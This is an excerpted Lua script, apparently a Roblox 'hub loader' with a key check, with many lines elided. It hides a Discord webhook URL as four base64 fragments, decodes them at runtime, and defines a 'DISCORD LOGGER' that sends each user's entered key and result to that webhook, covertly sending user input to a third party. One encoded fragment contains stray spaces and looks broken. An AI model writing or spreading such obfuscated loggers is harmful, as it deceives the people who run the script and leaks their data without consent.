--========================================================--
-- vrplxswv HUB LOADER V5 (STABLE, PATCHED)
--========================================================--
...
local function b64decode(data)
    ...
    return (data:gsub(".", function(x)
        ...
        local bits = ""
        local val = base64chars:find(x) - 1
        for i = 6, 1, -1 do
            bits = bits .. ((val >> (i - 1)) & 1)
        end
        return bits
        ...
        return string.char(tonumber(chunk, 2))
    end))
end

---------------------------------------------------------------------
-- NEW WEBHOOK (OBFUSCATED)
---------------------------------------------------------------------
local wbA = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
local wbB = "MTQ0NTk2NTQ1MzcyNDc0OTk0NS9temI0YTd tUXFs c0RXTGlz"
local wbC = "YXY3dDZHYnNyRkNfeGpsX0dUeDhFaWFCdTFjUnE4Z3Fy"
local wbD = "T25Qdmlzbm9VUzAxbUgtWTNyMA=="

local WEBHOOK = b64decode(wbA .. wbB .. wbC .. wbD)
...
---------------------------------------------------------------------
local dt = os.date("!*t")
local raw = "vrplxswv" .. dt.year .. string.format("%02d",dt.month) .. string.format("%02d",dt.day)
...
local function isOwner()
    return game.Players.LocalPlayer.UserId == ownerId()
end
...
-- DISCORD LOGGER
---------------------------------------------------------------------
local function sendLog(result, entered)
    ...
    local payload = {
        ...
        embeds = {{
            ...
            fields = {
                ...
                { name="Entered Key", value=entered, inline=true },
...
msg.Position = UDim2.new(0,0,0.23,0)
